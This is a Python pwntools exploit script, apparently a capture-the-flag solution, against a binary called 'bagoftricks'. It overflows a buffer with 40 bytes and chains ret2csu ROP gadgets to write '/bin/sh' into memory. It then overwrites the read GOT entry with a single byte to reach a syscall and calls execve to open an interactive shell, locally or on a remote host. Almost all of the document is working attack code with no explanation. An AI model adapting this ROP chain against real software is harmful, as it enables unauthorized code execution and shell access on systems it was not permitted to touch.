#!/bin/python3

from pwn import *
from os import *
import argparse

chdir('../setup')

def stringToHex(s):
    return ":".join("{:02x}".format(ord(c)) for c in s)


libc_dir = "./libc.so.6"
# os.environ['LD_PRELOAD'] = './ld-linux-x86-64.so.2 '+ libc_dir

libc = ELF(libc_dir)

# print(libc.symbols['_rtld_local_ro'])
# exit()
#context.terminal = ['terminator', '-x', 'sh', '-c']
context.terminal = ['tilix', '-a', 'session-add-down', '-e']
# fullscreen gdb mode
# context.terminal = ['terminator', '-f','-x', 'sh', '-c']


binaryName = "./bagoftricks"
elf = context.binary = ELF(binaryName)

gdbscript = '''
# b *0x4011d3
# b *0x401020
b main
# c
c
# finish
# ni 3
'''


if args.R:
    HOST = args.R.split(':')[0]
    PORT = args.R.split(':')[1]
    r = remote(HOST, PORT)
else:
    if args.GBD:
        r = gdb.debug(binaryName, gdbscript=gdbscript)
        # r = process(binaryName)
        # gdb.attach(r, gdbscript=gdbscript)
    else:
        r = process(binaryName)

str_bin_sh  = p64(0x404100) # 0x00404000 (bss) + 0x100
text        = p64(0x401000) # .text section
sys_execve  = p64(0x3b)
null        = p64(0x0)
one         = p64(0x1)
zero        = p64(0x0)
stdin       = p64(0x0)
stdout      = p64(0x1)
bin_sh      = b'/bin/sh\x00'
len_bin_sh  = p64(len(bin_sh))
junk        = b'JUNKJUNK'
csu_init1   = p64(0x4011ca) # pop rbx, pop rbp, pop r12, pop r13, pop r14, pop r15, ret 
csu_init2   = p64(0x4011b0) # mov r14 rdx, mov r13 rsi, mov r12 edi,call qword [r15 + rbx*8]



def ret2csu(func_GOT, rdi, rsi, rdx):
    ret_csu  = zero      # pop rbx
    ret_csu += one       # pop rbp
    ret_csu += rdi       # pop r12
    ret_csu += rsi       # pop r13
    ret_csu += rdx  # pop r14
    ret_csu += func_GOT  # pop r15
    ret_csu += csu_init2 # ret
    ret_csu += junk      # add rsp,0x8
    return ret_csu


rop = ROP(elf)# Find ROP gadgets

READ_GOT = elf.got['read'] 

print("READ_GOT: " + hex(READ_GOT))

crash = b'A' * 40

exploit = crash
# Write '/bin/sh' in str_bin_sh
exploit += csu_init1
exploit += ret2csu(p64(READ_GOT), stdin, str_bin_sh, len_bin_sh)

# Overwrite read@got with one_byte
exploit += ret2csu(p64(READ_GOT), stdin, p64(READ_GOT), one)

# Read arbitrary data in order to gt 0x3b in RAX
exploit += ret2csu(p64(READ_GOT), stdout, text, sys_execve)

# sys_execve('/bin/sh')
exploit += ret2csu(p64(READ_GOT), str_bin_sh, null, null)

payload = exploit.ljust(400, b'A')
print("exploit: " + str(len(exploit)))

r.send(payload)
r.send(bin_sh)
r.send('\x3c')

r.interactive()
